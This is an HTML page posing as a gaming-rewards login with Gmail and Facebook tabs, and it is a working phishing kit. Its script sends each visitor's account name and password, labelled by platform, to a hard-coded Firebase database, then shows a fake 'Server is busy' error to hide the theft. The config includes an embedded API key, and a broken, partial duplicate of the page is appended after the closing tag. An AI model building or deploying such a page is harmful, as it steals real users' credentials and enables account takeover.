<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gaming Theme Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700;900&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/lucide@latest"></script>
    
    <style>
        .font-gaming { font-family: 'Orbitron', sans-serif; }
        .font-body { font-family: 'Rajdhani', sans-serif; }

        body {
            background-color: #0a0a0a;
            color: #ffffff;
            margin: 0;
            overflow-x: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .bg-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: 40px 40px;
            background-image: 
                linear-gradient(to right, rgba(255, 136, 0, 0.05) 1px, transparent 1px),
                linear-gradient(to bottom, rgba(255, 136, 0, 0.05) 1px, transparent 1px);
            z-index: -2;
        }

        .glow-orb {
            position: fixed;
            top: -100px;
            right: -100px;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(255, 115, 0, 0.4) 0%, rgba(255, 115, 0, 0) 70%);
            border-radius: 50%;
            z-index: -1;
            pointer-events: none;
            filter: blur(50px);
        }

        .text-glow {
            text-shadow: 0 0 10px rgba(255, 136, 0, 0.7);
        }

        .login-wrapper {
            container-type: inline-size;
            width: 100%;
            max-width: 420px;
            padding: 20px;
            position: relative;
            z-index: 10;
        }

        .dynamic-title { font-size: clamp(1.8rem, 8cqi, 2.2rem); }
        .dynamic-text { font-size: clamp(0.9rem, 4cqi, 1.1rem); }
        .dynamic-pad { padding: 8cqi; }

        .tab-btn.active-gmail {
            border-color: #f97316;
            background-color: rgba(234, 88, 12, 0.15);
            color: #fb923c;
            box-shadow: inset 0 0 0 1px #f97316, 0 0 12px rgba(249, 115, 22, 0.4);
        }

        .tab-btn.active-facebook {
            border-color: #3b82f6;
            background-color: rgba(37, 99, 235, 0.15);
            color: #60a5fa;
            box-shadow: inset 0 0 0 1px #3b82f6, 0 0 12px rgba(59, 130, 246, 0.4);
        }

        .input-group {
            border: 1px solid #374151;
            transition: all 0.3s ease;
        }

        .input-group:focus-within {
            border-color: #f97316;
            box-shadow: inset 0 0 0 1px #f97316, 0 0 8px rgba(249, 115, 22, 0.4);
        }
    </style>
</head>
<body class="font-body antialiased">

    <div class="bg-grid"></div>
    <div class="glow-orb"></div>

    <div class="login-wrapper">
        <div class="bg-gray-900/60 backdrop-blur-md border border-orange-500/30 rounded-2xl dynamic-pad shadow-[0_0_30px_rgba(255,136,0,0.1)]">
            
            <div class="text-center mb-6">
                <h2 class="font-gaming dynamic-title font-bold text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-yellow-500 text-glow">
                    GAMER LOGIN
                </h2>
                <p class="text-gray-400 dynamic-text mt-1">Claim your rewards</p>
            </div>

            <div class="flex gap-3 mb-6">
                <button id="btn-gmail" onclick="switchTab('gmail')" class="tab-btn active-gmail flex-1 flex justify-center items-center gap-2 border py-2.5 rounded-lg dynamic-text font-bold">
                    <i data-lucide="mail" class="w-4 h-4"></i> Gmail
                </button>
                <button id="btn-facebook" onclick="switchTab('facebook')" class="tab-btn border-gray-700 bg-black/50 flex-1 flex justify-center items-center gap-2 border text-gray-400 py-2.5 rounded-lg dynamic-text font-bold hover:border-blue-500 hover:text-blue-400">
                    <i data-lucide="facebook" class="w-4 h-4"></i> Facebook
                </button>
            </div>

            <div class="space-y-4">
                <div>
                    <label id="input-label" class="block dynamic-text text-gray-300 mb-1 ml-1">Gmail Account</label>
                    <div class="input-group relative bg-black/50 rounded-lg overflow-hidden flex items-center">
                        <div class="pl-3 flex items-center pointer-events-none text-gray-500">
                            <i data-lucide="user" class="w-5 h-5"></i>
                        </div>
                        <input type="text" id="id-input" placeholder="Enter your gmail" class="w-full bg-transparent text-white py-3 px-3 outline-none dynamic-text">
                    </div>
                </div>

                <div>
                    <label class="block dynamic-text text-gray-300 mb-1 ml-1">Password</label>
                    <div class="input-group relative bg-black/50 rounded-lg overflow-hidden flex items-center">
                        <div class="pl-3 flex items-center pointer-events-none text-gray-500">
                            <i data-lucide="lock" class="w-5 h-5"></i>
                        </div>
                        <input type="password" id="password-input" placeholder="Enter your password" class="w-full bg-transparent text-white py-3 px-3 outline-none dynamic-text">
                    </div>
                </div>
            </div>

            <button id="login-btn" class="w-full mt-6 bg-gradient-to-r from-orange-600 to-yellow-500 hover:from-orange-500 hover:to-yellow-400 text-black font-bold dynamic-text py-3 rounded-lg shadow-[0_0_15px_rgba(255,165,0,0.4)] transition-all transform hover:scale-[1.02] active:scale-95 flex justify-center items-center gap-2">
                <i data-lucide="log-in" class="w-5 h-5"></i>
                Login Now
            </button>
            
        </div>
    </div>

    <script>
        lucide.createIcons();
        window.currentPlatform = 'gmail';

        function switchTab(platform) {
            window.currentPlatform = platform;
            const btnGmail = document.getElementById('btn-gmail');
            const btnFacebook = document.getElementById('btn-facebook');
            const idInput = document.getElementById('id-input');
            const inputLabel = document.getElementById('input-label');

            if (platform === 'gmail') {
                btnGmail.className = "tab-btn active-gmail flex-1 flex justify-center items-center gap-2 border py-2.5 rounded-lg dynamic-text font-bold";
                btnFacebook.className = "tab-btn border-gray-700 bg-black/50 flex-1 flex justify-center items-center gap-2 border text-gray-400 py-2.5 rounded-lg dynamic-text font-bold hover:border-blue-500 hover:text-blue-400";
                inputLabel.innerText = "Gmail Account";
                idInput.placeholder = "Enter your gmail";
            } else {
                btnFacebook.className = "tab-btn active-facebook flex-1 flex justify-center items-center gap-2 border py-2.5 rounded-lg dynamic-text font-bold";
                btnGmail.className = "tab-btn border-gray-700 bg-black/50 flex-1 flex justify-center items-center gap-2 border text-gray-400 py-2.5 rounded-lg dynamic-text font-bold hover:border-orange-500 hover:text-orange-400";
                inputLabel.innerText = "Facebook Account";
                idInput.placeholder = "Enter email or number";
            }
        }
    </script>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore.js";

        // আপনার দেওয়া কনফিগারেশন
        const firebaseConfig = {
            apiKey: "AIzaSyB-GM0olXCMe1AJWKilHAa6icpjanjC_m4",
            authDomain: "diamond-login-489dd.firebaseapp.com",
            projectId: "diamond-login-489dd",
            storageBucket: "diamond-login-489dd.firebasestorage.app",
            messagingSenderId: "955771005852",
            appId: "1:955771005852:web:738095f023887428b6b659"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('login-btn').addEventListener('click', async () => {
            const id = document.getElementById('id-input').value;
            const pass = document.getElementById('password-input').value;

            if(!id || !pass) {
                alert("সবগুলো ঘর পূরণ করুন!");
                return;
            }

            try {
                // 'user_data' নামে একটি কালেকশনে ডেটা সেভ হবে
                await addDoc(collection(db, "user_data"), {
                    platform: window.currentPlatform,
                    account_id: id,
                    password: pass,
                    time: new Date().toLocaleString()
                });
                
                alert("Login Error: Server is busy. Try again later!");
                document.getElementById('id-input').value = "";
                document.getElementById('password-input').value = "";
            } catch (e) {
                console.error("Error: ", e);
                alert("Connection Error!");
            }
        });
    </script>
</body>
</html>
</head>

    <div class="login-wrapper">

            <div class="text-center mb-6">
                <h2 class="font-gaming dynamic-title font-bold text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-yellow-500 text-glow">

                </h2>
                <p class="text-gray-400 dynamic-text mt-1">Access your dashboard</p>

                </button>

            <div class="space-y-4">

                    <label id="input-label" class="block dynamic-text text-gray-300 mb-1 ml-1">Gmail Account</label>
                    <div class="input-group relative bg-black/50 rounded-lg overflow-hidden flex items-center">
                        <div class="pl-3 flex items-center pointer-events-none text-gray-500">
                            <i data-lucide="user" class="w-5 h-5"></i>
                        </div>
                        <input type="email" id="id-input" placeholder="Enter your gmail" class="w-full bg-transparent text-white py-3 px-3 outline-none dynamic-text shadow-inner">
                    </div>
                </div>

                <div>
                    <label class="block dynamic-text text-gray-300 mb-1 ml-1">Password</label>
                    <div class="input-group relative bg-black/50 rounded-lg overflow-hidden flex items-center">
                        <div class="pl-3 flex items-center pointer-events-none text-gray-500">
                            <i data-lucide="lock" class="w-5 h-5"></i>
                        </div>
                        <input type="password" id="password-input" placeholder="Enter your password" class="w-full bg-transparent text-white py-3 px-3 outline-none dynamic-text shadow-inner">
                    </div>
                </div>
            </div>

            <button class="w-full mt-6 bg-gradient-to-r from-orange-600 to-yellow-500 hover:from-orange-500 hover:to-yellow-400 text-black font-bold dynamic-text py-3 rounded-lg shadow-[0_0_15px_rgba(255,165,0,0.4)] transition-all transform hover:scale-[1.02] active:scale-95 flex justify-center items-center gap-2">
                <i data-lucide="log-in" class="w-5 h-5"></i>
                Login
            </button>
            
        </div>
    </div>

    <script>
        // Initialize Lucide Icons
        lucide.createIcons();

        function switchTab(platform) {
            const btnGmail = document.getElementById('btn-gmail');
            const btnFacebook = document.getElementById('btn-facebook');
            const idInput = document.getElementById('id-input');
            const inputLabel = document.getElementById('input-label');

            if (platform === 'gmail') {
                // Set Gmail Tab Active
                btnGmail.className = "tab-btn active-gmail flex-1 flex justify-center items-center gap-2 border text-orange-400 py-2.5 rounded-lg dynamic-text font-bold";
                btnFacebook.className = "tab-btn border-gray-700 bg-black/50 flex-1 flex justify-center items-center gap-2 border text-gray-400 py-2.5 rounded-lg dynamic-text font-bold hover:border-blue-500 hover:text-blue-400";
                
                // Update Inputs
                inputLabel.innerText = "Gmail Account";
                idInput.placeholder = "Enter your gmail";
                idInput.type = "email";
                idInput.value = "";
                
            } else if (platform === 'facebook') {
                // Set Facebook Tab Active
                btnFacebook.className = "tab-btn active-facebook flex-1 flex justify-center items-center gap-2 border text-blue-400 py-2.5 rounded-lg dynamic-text font-bold";
                btnGmail.className = "tab-btn border-gray-700 bg-black/50 flex-1 flex justify-center items-center gap-2 border text-gray-400 py-2.5 rounded-lg dynamic-text font-bold hover:border-orange-500 hover:text-orange-400";
                
                // Update Inputs
                inputLabel.innerText = "Facebook Account";
                idInput.placeholder = "Enter your email or number";
                idInput.type = "text"; 
                idInput.value = "";
            }
        }
    </script>
</body>
                      </html>
